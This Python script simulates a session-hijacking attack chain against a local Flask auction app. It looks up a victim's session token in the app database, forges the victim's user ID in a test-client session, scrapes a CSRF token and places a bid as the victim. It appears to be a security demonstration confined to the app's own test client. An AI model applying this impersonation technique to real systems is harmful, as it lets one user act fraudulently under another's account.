# simulate_session_hijack_attack.py
# This script simulates a full attack chain: attacker reads session DB and impersonates a victim to place a bid.

from app import app
from models import db, User, Session, Auction
from bs4 import BeautifulSoup

def extract_victim_session():
    with app.app_context():
        # Step 1: Attacker accesses DB and finds a known user
        victim = User.query.filter_by(username='Clid').first()
        print(f"[+] Found victim user: {victim.username} (id={victim.id})")

        # Step 2: Extract session token for victim
        session = Session.query.filter_by(user_id=victim.id).first()
        if session:
            print(f"[+] Leaked session token: {session.token}")
        else:
            print("[-] Victim has no active session. Cannot continue.")
            return None, None

        return victim.id, session.token


def spoof_session_and_bid(victim_id, auction_id):
    print("[!] Simulating session hijack by spoofing Flask _user_id...")
    client = app.test_client()

    with client.session_transaction() as sess:
        sess['_user_id'] = str(victim_id)

    # Step 1: Get the CSRF token from the auction detail page
    auction_page = client.get(f'/auction/{auction_id}')
    
    soup = BeautifulSoup(auction_page.data, 'html.parser')
    csrf_input = soup.find('input', {'name': 'csrf_token'})
    csrf_token = csrf_input['value'] if csrf_input else None

    if not csrf_token:
        print("[-] Failed to retrieve CSRF token.")
        return
    print(f"[+] Retrieved CSRF token: {csrf_token}")
    
    # Step 2: Set the CSRF token in the session
    bid_amount = 9999.99
    response = client.post(
            f'/auction/{auction_id}/bid',
            data={
                'bid_amount': bid_amount,
                'csrf_token': csrf_token
            },
            follow_redirects=True
        )
    print(f"Bid status code: {response.status_code}")
    if b'Your bid has been placed!' in response.data:
        print(f"[+] Successfully placed bid as victim! Amount: {bid_amount}")
    else:
        print("[-] Failed to place bid. Something went wrong.")


def main():
    victim_id, token = extract_victim_session()
    if victim_id:
        # Step 5: Pick any open auction to exploit
        with app.app_context():
            auction = Auction.query.filter_by(status='active').first()
            if auction:
                spoof_session_and_bid(victim_id, auction.id)
            else:
                print("[-] No active auctions found.")


if __name__ == '__main__':
    main()
